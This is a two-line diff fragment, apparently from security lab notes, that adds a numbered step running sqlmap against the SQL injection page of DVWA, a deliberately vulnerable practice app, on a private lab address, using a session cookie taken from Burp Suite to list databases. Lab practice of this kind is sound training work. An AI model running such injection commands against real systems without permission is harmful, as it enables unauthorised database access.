@@ -1,0 +1,2 @@
+17
+- sqlmap -u “http://10.0.2.12/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit” --cookie=”<value as copied from Burp Suite>” --method=GET --dbs
